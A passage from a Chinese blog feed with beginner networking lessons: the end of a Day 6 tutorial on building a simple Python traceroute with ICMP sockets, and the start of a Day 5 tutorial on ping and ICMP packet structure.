socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br>        recv_sock.settimeout(timeout)<br>    <span class="hljs-keyword">except</span> PermissionError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 需要管理员权限运行此程序&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;💡 Linux/Mac: sudo python day06_simple_traceroute.py&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;💡 Windows: 以管理员身份运行&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    packet_id = <span class="hljs-number">12345</span><br>    reached = <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># 从TTL=1开始，逐步增加</span><br>    <span class="hljs-keyword">for</span> ttl <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, max_hops + <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 设置TTL</span><br>        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)<br><br>        <span class="hljs-comment"># 尝试3次</span><br>        hop_info = &#123;<br>            <span class="hljs-string">&#x27;ttl&#x27;</span>: ttl,<br>            <span class="hljs-string">&#x27;ip&#x27;</span>: <span class="hljs-literal">None</span>,<br>            <span class="hljs-string">&#x27;hostname&#x27;</span>: <span class="hljs-literal">None</span>,<br>            <span class="hljs-string">&#x27;rtts&#x27;</span>: []<br>        &#125;<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot; <span class="hljs-subst">&#123;ttl:2d&#125;</span>  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>, flush=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(tries):<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># 创建并发送ICMP包</span><br>                packet = create_icmp_packet(packet_id, ttl)<br>                send_time = time.time()<br>                send_sock.sendto(packet, (dest_ip, <span class="hljs-number">0</span>))<br><br>                <span class="hljs-comment"># 接收回复</span><br>                <span class="hljs-keyword">try</span>:<br>                    reply_packet, addr = recv_sock.recvfrom(<span class="hljs-number">1024</span>)<br>                    recv_time = time.time()<br>                    rtt = (recv_time - send_time) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># 转换为毫秒</span><br><br>                    <span class="hljs-comment"># 解析回复</span><br>                    icmp_type, source_ip = parse_icmp_reply(reply_packet)<br><br>                    <span class="hljs-comment"># 记录信息</span><br>                    <span class="hljs-keyword">if</span> hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>] <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                        hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>] = source_ip<br><br>                        <span class="hljs-comment"># 尝试获取主机名</span><br>                        <span class="hljs-keyword">try</span>:<br>                            hostname = socket.gethostbyaddr(source_ip)[<span class="hljs-number">0</span>]<br>                            hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>] = hostname<br>                        <span class="hljs-keyword">except</span>:<br>                            hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>] = source_ip<br><br>                    hop_info[<span class="hljs-string">&#x27;rtts&#x27;</span>].append(rtt)<br><br>                    <span class="hljs-comment"># ICMP类型11 = Time Exceeded（中间路由器）</span><br>                    <span class="hljs-comment"># ICMP类型0 = Echo Reply（到达目的地）</span><br>                    <span class="hljs-keyword">if</span> icmp_type == <span class="hljs-number">0</span>:<br>                        reached = <span class="hljs-literal">True</span><br><br>                <span class="hljs-keyword">except</span> socket.timeout:<br>                    hop_info[<span class="hljs-string">&#x27;rtts&#x27;</span>].append(<span class="hljs-literal">None</span>)<br><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                hop_info[<span class="hljs-string">&#x27;rtts&#x27;</span>].append(<span class="hljs-literal">None</span>)<br><br>        <span class="hljs-comment"># 打印这一跳的信息</span><br>        <span class="hljs-keyword">if</span> hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>]:<br>            <span class="hljs-keyword">if</span> hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>] <span class="hljs-keyword">and</span> hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>] != hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>]:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>]&#125;</span> (<span class="hljs-subst">&#123;hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>]&#125;</span>)  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>]&#125;</span>  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br><br>            <span class="hljs-comment"># 打印RTT</span><br>            <span class="hljs-keyword">for</span> rtt <span class="hljs-keyword">in</span> hop_info[<span class="hljs-string">&#x27;rtts&#x27;</span>]:<br>                <span class="hljs-keyword">if</span> rtt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;rtt:<span class="hljs-number">.2</span>f&#125;</span> ms  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;* * *&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>()  <span class="hljs-comment"># 换行</span><br><br>        <span class="hljs-comment"># 如果到达目的地，停止</span><br>        <span class="hljs-keyword">if</span> reached:<br>            <span class="hljs-built_in">print</span>()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 已到达目的地 <span class="hljs-subst">&#123;dest_ip&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> reached:<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;⚠️  未能在<span class="hljs-subst">&#123;max_hops&#125;</span>跳内到达目的地&quot;</span>)<br><br>    send_sock.close()<br>    recv_sock.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;简易Traceroute工具&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 获取目标主机</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>        host = sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        host = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要追踪的主机名或IP: &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> host:<br>            host = <span class="hljs-string">&quot;baidu.com&quot;</span>  <span class="hljs-comment"># 默认</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n🔍 开始追踪路由路径...\n&quot;</span>)<br><br>    <span class="hljs-comment"># 执行traceroute</span><br>    traceroute(host, max_hops=<span class="hljs-number">30</span>, timeout=<span class="hljs-number">2</span>, tries=<span class="hljs-number">3</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n💡 说明:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - 每一行代表一跳（一个路由器）&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - 显示3次测试的RTT时间&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - * 表示该路由器没有响应&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - 某些路由器可能禁用了ICMP响应&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="运行程序">运行程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux/Mac（需要root权限）</span><br><span class="hljs-built_in">sudo</span> python code/day06/day06_simple_traceroute.py baidu.com<br><br><span class="hljs-comment"># Windows（以管理员身份运行）</span><br>python code\day06\day06_simple_traceroute.py baidu.com<br></code></pre></td></tr></table></figure><h3 id="预期输出">预期输出</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">======================================================================<br>                      简易Traceroute工具<br>======================================================================<br><br>🔍 开始追踪路由路径...<br><br>traceroute to baidu.com, <span class="hljs-number">30</span> hops max<br><br>目标IP: <span class="hljs-number">220.181</span>.<span class="hljs-number">38.148</span><br>----------------------------------------------------------------------<br>  <span class="hljs-number">1</span>  <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>  <span class="hljs-number">1.23</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">12</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">09</span> <span class="hljs-keyword">ms</span><br>  <span class="hljs-title">2</span>  <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>  <span class="hljs-number">5.67</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">43</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">34</span> <span class="hljs-keyword">ms</span><br>  <span class="hljs-title">3</span>  <span class="hljs-number">61.135</span>.<span class="hljs-number">169.1</span>  <span class="hljs-number">12.34</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">12</span>.<span class="hljs-number">23</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">12</span>.<span class="hljs-number">12</span> <span class="hljs-keyword">ms</span><br>  <span class="hljs-title">4</span>  <span class="hljs-number">61.135</span>.<span class="hljs-number">169.125</span>  <span class="hljs-number">15.67</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">15</span>.<span class="hljs-number">56</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">15</span>.<span class="hljs-number">45</span> <span class="hljs-keyword">ms</span><br>  <span class="hljs-title">5</span>  * * *<br>  <span class="hljs-number">6</span>  <span class="hljs-number">220.181</span>.<span class="hljs-number">38.148</span>  <span class="hljs-number">28.90</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">28</span>.<span class="hljs-number">78</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">28</span>.<span class="hljs-number">67</span> <span class="hljs-keyword">ms</span><br><br><span class="hljs-title">✅ 已到达目的地 220</span>.<span class="hljs-number">181.38</span>.<span class="hljs-number">148</span><br><br>======================================================================<br><br>💡 说明:<br>   - 每一行代表一跳（一个路由器）<br>   - 显示<span class="hljs-number">3</span>次测试的RTT时间<br>   - * 表示该路由器没有响应<br>   - 某些路由器可能禁用了ICMP响应<br>======================================================================<br></code></pre></td></tr></table></figure><h2 id="🔍-代码详解">🔍 代码详解</h2><h3 id="1-设置TTL">1. 设置TTL</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)<br></code></pre></td></tr></table></figure><p>这是关键！通过设置socket的TTL选项，我们可以控制数据包能经过多少个路由器。</p><h3 id="2-ICMP消息类型">2. ICMP消息类型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 收到的ICMP类型：</span><br>- 类型<span class="hljs-number">11</span>（Time Exceeded）：中间路由器返回，说明TTL耗尽<br>- 类型<span class="hljs-number">0</span>（Echo Reply）：目标主机返回，说明到达目的地<br></code></pre></td></tr></table></figure><h3 id="3-为什么要尝试3次？">3. 为什么要尝试3次？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(tries):  <span class="hljs-comment"># 尝试3次</span><br></code></pre></td></tr></table></figure><p><strong>原因</strong>：</p><ol><li>网络可能不稳定，单次测试不准确</li><li>可以计算平均延迟</li><li>可以检测丢包情况</li><li>与标准traceroute行为一致</li></ol><h3 id="4-为什么有些路由器显示-？">4. 为什么有些路由器显示 * * * ？</h3><p>可能的原因：</p><ol><li><strong>防火墙阻止</strong>：该路由器配置了防火墙，不响应ICMP</li><li><strong>安全策略</strong>：运营商出于安全考虑，禁用了ICMP响应</li><li><strong>负载均衡</strong>：每次请求可能走不同路径</li><li><strong>超时</strong>：路由器太忙，来不及响应</li></ol><h2 id="🎓-知识小结">🎓 知识小结</h2><h3 id="今天学到了什么？">今天学到了什么？</h3><ol><li>✅ traceroute通过逐步增加TTL来追踪路径</li><li>✅ TTL=0时路由器返回&quot;Time Exceeded&quot;消息</li><li>✅ 每一跳通常测试3次以获得稳定数据</li><li>✅ 某些路由器可能不响应ICMP</li></ol><h3 id="traceroute-vs-ping">traceroute vs ping</h3><table><thead><tr><th>特性</th><th>ping</th><th>traceroute</th></tr></thead><tbody><tr><td>目的</td><td>测试连通性</td><td>追踪路径</td></tr><tr><td>显示内容</td><td>目标主机信息</td><td>所有中间路由器</td></tr><tr><td>TTL设置</td><td>固定（通常64）</td><td>递增（1, 2, 3…）</td></tr><tr><td>数据包数量</td><td>少</td><td>多</td></tr><tr><td>执行速度</td><td>快</td><td>慢</td></tr></tbody></table><h3 id="Windows-vs-Linux-Mac">Windows vs Linux/Mac</h3><table><thead><tr><th>特性</th><th>Windows (tracert)</th><th>Linux/Mac (traceroute)</th></tr></thead><tbody><tr><td>协议</td><td>ICMP</td><td>UDP（默认）或ICMP</td></tr><tr><td>命令</td><td>tracert</td><td>traceroute</td></tr><tr><td>ICMP选项</td><td>默认</td><td>-I 参数</td></tr></tbody></table><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：实际操作">练习1：实际操作</h3><p>使用traceroute追踪以下网站，记录经过的跳数：</p><ol><li><a href="http://baidu.com">baidu.com</a></li><li><a href="http://google.com">google.com</a>（如果能访问）</li><li>你的学校或公司网站</li><li>国外的网站（观察延迟变化）</li></ol><h3 id="练习2：路径分析">练习2：路径分析</h3><p>观察traceroute的输出，回答：</p><ol><li>第一跳通常是什么设备？</li><li>为什么有些跳的延迟突然增大？</li><li>国内访问国外网站，通常在第几跳出国？</li></ol><h3 id="练习3：故障诊断">练习3：故障诊断</h3><p>如果traceroute显示以下情况，说明什么问题？</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>  <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>  <span class="hljs-number">1</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">2</span>  * * *<br><span class="hljs-number">3</span>  * * *<br><span class="hljs-number">4</span>  * * *<br>...<br></code></pre></td></tr></table></figure><h3 id="练习4：代码扩展">练习4：代码扩展</h3><p>扩展traceroute工具：</p><ol><li>添加路径可视化（绘制路由图）</li><li>支持同时追踪多个目标</li><li>记录历史路径，对比路径变化</li><li>添加AS号查询（自治系统号）</li></ol><h3 id="练习5：思考题">练习5：思考题</h3><ol><li>为什么去程和回程路径可能不同？</li><li>traceroute能用来攻击吗？</li><li>如何阻止别人traceroute你的服务器？</li></ol><h2 id="📚-扩展阅读">📚 扩展阅读</h2><h3 id="traceroute的不同实现方式">traceroute的不同实现方式</h3><h4 id="1-UDP方式（Linux默认）">1. UDP方式（Linux默认）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用UDP包，目标端口从33434开始递增</span><br>traceroute baidu.com<br><br>工作原理：<br>- 发送UDP包到不常用的端口<br>- 中间路由器：返回ICMP Time Exceeded<br>- 目标主机：返回ICMP Port Unreachable<br></code></pre></td></tr></table></figure><h4 id="2-ICMP方式（Windows默认）">2. ICMP方式（Windows默认）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用ICMP Echo Request</span><br>traceroute -I baidu.com  <span class="hljs-comment"># Linux</span><br>tracert baidu.com        <span class="hljs-comment"># Windows</span><br><br>工作原理：<br>- 发送ICMP Echo Request<br>- 中间路由器：返回ICMP Time Exceeded<br>- 目标主机：返回ICMP Echo Reply<br></code></pre></td></tr></table></figure><h4 id="3-TCP方式">3. TCP方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用TCP SYN包（需要指定端口）</span><br>traceroute -T -p 80 baidu.com<br><br>工作原理：<br>- 发送TCP SYN包到指定端口<br>- 中间路由器：返回ICMP Time Exceeded<br>- 目标主机：返回TCP SYN+ACK<br></code></pre></td></tr></table></figure><h3 id="MTR：增强版traceroute">MTR：增强版traceroute</h3><p>MTR（My Traceroute）结合了ping和traceroute的功能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span><br><span class="hljs-built_in">sudo</span> apt install mtr      <span class="hljs-comment"># Ubuntu/Debian</span><br>brew install mtr          <span class="hljs-comment"># Mac</span><br><br><span class="hljs-comment"># 使用</span><br><span class="hljs-built_in">sudo</span> mtr baidu.com<br></code></pre></td></tr></table></figure><p><strong>MTR的优势</strong>：</p><ul><li>实时更新</li><li>显示丢包率</li><li>显示每一跳的统计信息</li><li>更直观的界面</li></ul><h3 id="路由的变化">路由的变化</h3><p>互联网的路由不是固定的，会因为以下原因变化：</p><ol><li><strong>负载均衡</strong>：分散流量到不同路径</li><li><strong>路由策略</strong>：运营商动态调整路由</li><li><strong>故障切换</strong>：某条线路故障时自动切换</li><li><strong>时间因素</strong>：不同时段可能走不同路由</li></ol><h3 id="实际应用场景">实际应用场景</h3><ol><li><p><strong>网络故障诊断</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">情况：网站访问很慢<br>步骤：traceroute 查看哪一跳延迟高<br>结果：定位瓶颈所在<br></code></pre></td></tr></table></figure></li><li><p><strong>CDN检测</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">情况：想知道访问的是哪个CDN节点<br>步骤：traceroute 查看最后几跳<br>结果：发现CDN在本地，延迟低<br></code></pre></td></tr></table></figure></li><li><p><strong>网络拓扑发现</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">情况：想了解公司网络结构<br>步骤：traceroute 到不同内网地址<br>结果：绘制网络拓扑图<br></code></pre></td></tr></table></figure></li></ol><h3 id="有趣的发现">有趣的发现</h3><p><strong>地理位置与延迟</strong>：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">本地路由器：    <span class="hljs-number">1</span>-<span class="hljs-number">2</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">同城服务器：    10-30</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">相邻省份：      30-60</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">跨国连接：      100-300</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">全球另一端：    300-500</span> ms<br></code></pre></td></tr></table></figure><p><strong>光速的限制</strong>：</p><ul><li>光在光纤中的速度约为 200,000 km/s</li><li>地球周长约 40,000 km</li><li>理论上环绕地球一圈至少需要 200ms</li><li>实际延迟会更高（路由器处理时间）</li></ul><h2 id="🎯-明天预告">🎯 明天预告</h2><p><strong>第7天：Wireshark抓包入门</strong></p><p>我们将学习：</p><ul><li>Wireshark的基本使用</li><li>如何捕获和分析数据包</li><li>过滤器的使用技巧</li><li>实战：分析HTTP请求过程</li></ul><hr><p>💡 <strong>今日金句</strong>：追踪路由，就像在互联网上寻找宝藏的地图！</p><p>👉 <a href="day05.md">上一天：ping命令详解</a> | <a href="../../README.md">返回目录</a> | <a href="day07.md">下一天：Wireshark抓包入门</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>5天：网络命令入门 - ping</title>
    <link href="/2025/11/10/5%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8%20-%20ping/"/>
    <url>/2025/11/10/5%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8%20-%20ping/</url>
    
    <content type="html"><![CDATA[<h1>第5天：网络命令入门 - ping</h1><blockquote><p>“ping一下，网络通不通立刻知道。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>理解ping命令的工作原理</li><li>掌握ICMP协议基础知识</li><li>学会使用ping命令进行网络诊断</li><li>编写自己的ping工具</li></ul><h2 id="🎯-什么是ping？">🎯 什么是ping？</h2><h3 id="生活中的例子">生活中的例子</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">ping</span> <span class="hljs-operator">=</span> 喊话游戏<br><br>你：喂！能听到吗？ （发送）<br>朋友：能听到！         （回应）<br>你：太好了，通信正常！ （确认）<br></code></pre></td></tr></table></figure><p><strong>ping命令</strong>就是用来测试网络连通性的工具，它会发送一个数据包到目标主机，然后等待回应。</p><h3 id="ping的作用">ping的作用</h3><ol><li><strong>测试连通性</strong>：目标主机是否可达</li><li><strong>测量延迟</strong>：数据往返需要多少时间</li><li><strong>检测丢包</strong>：有多少数据包丢失了</li><li><strong>诊断网络问题</strong>：定位网络故障</li></ol><h2 id="📡-ICMP协议">📡 ICMP协议</h2><h3 id="什么是ICMP？">什么是ICMP？</h3><p><strong>ICMP</strong>（Internet Control Message Protocol，互联网控制消息协议）是TCP/IP协议族的一部分，工作在网际层（IP层）。</p><h3 id="ICMP的作用">ICMP的作用</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">ICMP</span> <span class="hljs-operator">=</span> 网络的<span class="hljs-string">&quot;通讯员&quot;</span><br><br>主要任务：<br><span class="hljs-number">1</span>. 报告错误（<span class="hljs-string">&quot;对方不在家&quot;</span>）<br><span class="hljs-number">2</span>. 诊断问题（<span class="hljs-string">&quot;ping测试&quot;</span>）<br><span class="hljs-number">3</span>. 提供反馈（<span class="hljs-string">&quot;超时了&quot;</span>）<br></code></pre></td></tr></table></figure><h3 id="常见的ICMP消息类型">常见的ICMP消息类型</h3><table><thead><tr><th>类型</th><th>名称</th><th>用途</th></tr></thead><tbody><tr><td>0</td><td>Echo Reply</td><td>ping的回应</td></tr><tr><td>3</td><td>Destination Unreachable</td><td>目标不可达</td></tr><tr><td>5</td><td>Redirect</td><td>重定向</td></tr><tr><td>8</td><td>Echo Request</td><td>ping的请求</td></tr><tr><td>11</td><td>Time Exceeded</td><td>超时（TTL=0）</td></tr></tbody></table><h2 id="🔍-ping的工作原理">🔍 ping的工作原理</h2><h3 id="完整流程">完整流程</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>. 发送 ICMP Echo Request（类型<span class="hljs-number">8</span>）<br>   你的电脑 → 目标主机<br>   &quot;你好，我是<span class="hljs-number">192.168.1.100</span>，请回应！&quot;<br><br><span class="hljs-number">2</span>. 接收 ICMP Echo Reply（类型<span class="hljs-number">0</span>）<br>   目标主机 → 你的电脑<br>   &quot;收到！我是<span class="hljs-number">8.8.8.8</span>，一切正常！&quot;<br><br><span class="hljs-number">3</span>. 计算RTT（往返时间）<br>   发送时间：<span class="hljs-number">10</span>:<span class="hljs-number">00:00.000</span><br>   接收时间：<span class="hljs-number">10</span>:<span class="hljs-number">00:00.050</span><br>   RTT = <span class="hljs-number">50</span>毫秒<br></code></pre></td></tr></table></figure><h3 id="RTT（Round-Trip-Time）">RTT（Round-Trip Time）</h3><p><strong>RTT</strong>：数据包从发送到收到回复的总时间</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RTT = 去程时间 + 回程时间<br><br>影响RTT的因素：<br><span class="hljs-bullet">- </span>物理距离（光速是有限的）<br><span class="hljs-bullet">- </span>网络拥塞<br><span class="hljs-bullet">- </span>路由器处理时间<br><span class="hljs-bullet">- </span>对方服务器处理时间<br></code></pre></td></tr></table></figure><h3 id="ICMP报文结构">ICMP报文结构</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ICMP Echo Request/Reply 格式：<br><br><span class="hljs-section">0               8              16              24              31</span><br><span class="hljs-section">+---------------+---------------+---------------+---------------+</span><br>|     类型      |     代码      |           校验和              |<br><span class="hljs-section">|   (Type)      |   (Code)      |         (Checksum)            |</span><br><span class="hljs-section">+---------------+---------------+---------------+---------------+</span><br><span class="hljs-section">|          标识符 (Identifier)   |      序列号 (Sequence)        |</span><br><span class="hljs-section">+---------------+---------------+---------------+---------------+</span><br>|                         数据 (Data)                            |<br><span class="hljs-section">|                         可选，用于填充                         |</span><br><span 